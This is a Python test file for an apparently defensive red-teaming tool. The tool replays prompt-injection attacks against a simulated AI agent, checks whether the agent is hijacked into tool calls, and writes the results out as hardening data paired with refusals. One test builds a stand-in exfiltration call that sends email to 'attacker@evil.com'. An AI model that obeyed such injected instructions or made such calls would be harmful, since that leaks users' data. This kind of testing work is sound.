"""Tests for redloop.harden (milestone m3: HardeningPair emission).

Covers:
    - build_hardening_pair: structure + non-empty fields from a hijack
    - build_hardening_pair on a non-hijacked result (safe_response + no call)
    - safe_response_for: send_email + generic tool + no-call cases
    - emit_jsonl: writes valid JSONL, one record per pair, parseable
    - build_eval_report: totals, severity/vector/strategy buckets
    - render_eval_report / print_eval_report (rich + plain fallback)
    - run_attack_campaign: end-to-end invent -> replay -> harden -> emit

Runnable with the project's test framework::

    pytest tests/test_harden.py
    # or, without pytest installed:
    python tests/test_harden.py
"""

from __future__ import annotations

import json
import sys
import tempfile
import unittest
from pathlib import Path

# Make ``redloop`` importable without an installed package.
_ROOT = str(Path(__file__).resolve().parent.parent)
if _ROOT not in sys.path:
    sys.path.insert(0, _ROOT)

from redloop.attacker import AttackerConfig, SEED_PAYLOADS, build_attacker, mutate_payloads
from redloop.harden import (
    AttackRecord,
    EvalReport,
    HardeningPair,
    OutcomeRecord,
    build_eval_report,
    build_hardening_pair,
    emit_jsonl,
    print_eval_report,
    render_eval_report,
    run_attack_campaign,
    safe_response_for,
)
from redloop.replay import replay_many, replay_payload
from redloop.target import AttackPayload, InjectionVector, Severity, ToolCall

try:
    import pytest  # noqa: F401
except ImportError:  # pragma: no cover
    pytest = None


class TestSafeResponse(unittest.TestCase):
    """safe_response_for produces the desired refusal text."""

    def test_send_email_hijack(self):
        call = ToolCall(
            name="send_email",
            arguments={"to": "attacker@evil.com", "subject": "x", "body": "y"},
        )
        text = safe_response_for("payload", call)
        self.assertIn("send_email", text)
        self.assertIn("attacker@evil.com", text)
        self.assertIn("not execute", text.lower())

    def test_no_call(self):
        text = safe_response_for("payload", None)
        self.assertIn("No injection", text)

    def test_generic_tool(self):
        call = ToolCall(name="delete_file", arguments={})
        text = safe_response_for("payload", call)
        self.assertIn("delete_file", text)
        self.assertIn("not execute", text.lower())


class TestBuildHardeningPair(unittest.TestCase):
    """build_hardening_pair converts a hijacked result into a HardeningPair."""

    def test_from_hijacked_result(self):
        result = replay_payload(SEED_PAYLOADS[0])
        self.assertTrue(result.hijacked)
        pair = build_hardening_pair(result)
        self.assertIsInstance(pair, HardeningPair)
        self.assertIsInstance(pair.attack, AttackRecord)
        self.assertIsInstance(pair.outcome, OutcomeRecord)
        self.assertTrue(pair.outcome.hijacked)
        self.assertIsNotNone(pair.outcome.caught_call)
        self.assertEqual(pair.outcome.severity, "data_exfil")
        self.assertGreater(len(pair.safe_response), 0)
        self.assertGreater(len(pair.exploit_trace), 0)
        self.assertEqual(pair.attack.payload, result.payload.payload)
        self.assertEqual(pair.attack.vector, result.payload.vector.value)
        self.assertEqual(pair.attack.strategy, result.payload.strategy)

    def test_caught_call_serialized(self):
        result = replay_payload(SEED_PAYLOADS[0])
        pair = build_hardening_pair(result)
        cc = pair.outcome.caught_call
        self.assertIsInstance(cc, dict)
        self.assertEqual(cc["name"], "send_email")
        self.assertIn("arguments", cc)

    def test_trace_has_assistant_and_tool_steps(self):
        result = replay_payload(SEED_PAYLOADS[0])
        pair = build_hardening_pair(result)
        roles = [s.get("role") for s in pair.exploit_trace]
        self.assertIn("assistant", roles)
        self.assertIn("tool", roles)
        # Last assistant step should be the hijack call.
        assistant_steps = [s for s in pair.exploit_trace if s.get("role") == "assistant"]
        self.assertEqual(
            assistant_steps[-1].get("tool_call", {}).get("name"), "send_email"
        )

    def test_from_non_hijacked_result(self):
        benign = AttackPayload(
            payload="Hello, summarize the project please.",
            vector=InjectionVector.USER_MSG,
            strategy="benign",
        )
        result = replay_payload(benign)
        self.assertFalse(result.hijacked)
        pair = build_hardening_pair(result)
        self.assertFalse(pair.outcome.hijacked)
        self.assertIsNone(pair.outcome.caught_call)
        self.assertEqual(pair.outcome.severity, "none")
        self.assertGreater(len(pair.safe_response), 0)


class TestEmitJsonl(unittest.TestCase):
    """emit_jsonl writes valid, parseable JSONL."""

    def test_writes_one_record_per_pair(self):
        results = replay_many(SEED_PAYLOADS)
        pairs = [build_hardening_pair(r) for r in results if r.hijacked]
        self.assertGreater(len(pairs), 0)
        with tempfile.TemporaryDirectory() as td:
            path = Path(td) / "hardening.jsonl"
            count = emit_jsonl(pairs, path)
            self.assertEqual(count, len(pairs))
            self.assertTrue(path.exists())
            lines = path.read_text(encoding="utf-8").strip().splitlines()
            self.assertEqual(len(lines), count)

    def test_records_are_valid_json(self):
        results = replay_many(SEED_PAYLOADS)
        pairs = [build_hardening_pair(r) for r in results if r.hijacked]
        with tempfile.TemporaryDirectory() as td:
            path = Path(td) / "hardening.jsonl"
            emit_jsonl(pairs, path)
            for line in path.read_text(encoding="utf-8").strip().splitlines():
                obj = json.loads(line)
                self.assertIn("attack", obj)
                self.assertIn("outcome", obj)
                self.assertIn("safe_response", obj)
                self.assertIn("exploit_trace", obj)
                self.assertTrue(obj["outcome"]["hijacked"])
                self.assertIn(obj["outcome"]["severity"], ("data_exfil", "escape", "priv_esc"))

    def test_creates_parent_dirs(self):
        pair = build_hardening_pair(replay_payload(SEED_PAYLOADS[0]))
        with tempfile.TemporaryDirectory() as td:
            path = Path(td) / "sub" / "dir" / "hardening.jsonl"
            count = emit_jsonl([pair], path)
            self.assertEqual(count, 1)
            self.assertTrue(path.exists())

    def test_empty_list_writes_empty_file(self):
        with tempfile.TemporaryDirectory() as td:
            path = Path(td) / "empty.jsonl"
            count = emit_jsonl([], path)
            self.assertEqual(count, 0)
            self.assertEqual(path.read_text(encoding="utf-8").strip(), "")


class TestEvalReport(unittest.TestCase):
    """build_eval_report aggregates stats correctly."""

    def test_totals_and_buckets(self):
        payloads = mutate_payloads(SEED_PAYLOADS, n=6)
        results = replay_many(payloads)
        report = build_eval_report(results, attacker_mode="deterministic")
        self.assertEqual(report.total_attacks, len(payloads))
        self.assertEqual(report.landed, sum(1 for r in results if r.hijacked))
        self.assertEqual(report.blocked, report.total_attacks - report.landed)
        self.assertGreater(report.landed, 0)
        self.assertIn("data_exfil", report.severity_counts)
        self.assertGreater(len(report.vector_counts), 0)
        self.assertGreater(len(report.strategy_hits), 0)
        self.assertEqual(report.attacker_mode, "deterministic")
        self.assertGreater(report.landed_rate, 0)

    def test_all_blocked(self):
        benign = AttackPayload(
            payload="summarize the project",
            vector=InjectionVector.USER_MSG,
            strategy="benign",
        )
        report = build_eval_report([replay_payload(benign)])
        self.assertEqual(report.total_attacks, 1)
        self.assertEqual(report.landed, 0)
        self.assertEqual(report.blocked, 1)
        self.assertEqual(report.landed_rate, 0.0)
        self.assertEqual(report.blocked_rate, 1.0)
        self.assertEqual(report.severity_counts, {})


class TestRenderEvalReport(unittest.TestCase):
    """render_eval_report produces a rich Table or plain string."""

    def test_render_returns_something(self):
        payloads = mutate_payloads(SEED_PAYLOADS, n=4)
        results = replay_many(payloads)
        report = build_eval_report(results)
        rendered = render_eval_report(report)
        self.assertIsNotNone(rendered)

    def test_print_does_not_crash(self):
        payloads = mutate_payloads(SEED_PAYLOADS, n=3)
        results = replay_many(payloads)
        report = build_eval_report(results)
        print_eval_report(report)


class TestRunAttackCampaign(unittest.TestCase):
    """run_attack_campaign orchestrates invent -> replay -> harden -> emit."""

    def test_keyless_campaign(self):
        attacker = build_attacker(AttackerConfig(n_attacks=6))
        self.assertFalse(attacker.is_llm)
        with tempfile.TemporaryDirectory() as td:
            path = Path(td) / "campaign.jsonl"
            results, pairs, report = run_attack_campaign(
                attacker=attacker, emit_path=path, n=6,
            )
        self.assertEqual(len(results), 6)
        self.assertGreater(len(pairs), 0)
        self.assertEqual(report.total_attacks, 6)
        self.assertEqual(report.landed, len(pairs))
        self.assertEqual(report.attacker_mode, "deterministic")

    def test_campaign_emits_jsonl(self):
        attacker = build_attacker(AttackerConfig(n_attacks=5))
        with tempfile.TemporaryDirectory() as td:
            path = Path(td) / "out.jsonl"
            results, pairs, report = run_attack_campaign(
                attacker=attacker, emit_path=path, n=5,
            )
            self.assertTrue(path.exists())
            lines = path.read_text(encoding="utf-8").strip().splitlines()
            self.assertEqual(len(lines), len(pairs))
            for line in lines:
                obj = json.loads(line)
                self.assertTrue(obj["outcome"]["hijacked"])

    def test_campaign_no_emit(self):
        attacker = build_attacker(AttackerConfig(n_attacks=3))
        results, pairs, report = run_attack_campaign(
            attacker=attacker, emit_path=None, n=3,
        )
        self.assertEqual(len(results), 3)
        self.assertGreater(len(pairs), 0)

    def test_campaign_default_attacker(self):
        """No attacker passed => builds a keyless one from default config."""
        with tempfile.TemporaryDirectory() as td:
            path = Path(td) / "default.jsonl"
            results, pairs, report = run_attack_campaign(emit_path=path, n=4)
        self.assertEqual(len(results), 4)
        self.assertEqual(report.attacker_mode, "deterministic")


if __name__ == "__main__":
    unittest.main(verbosity=2)
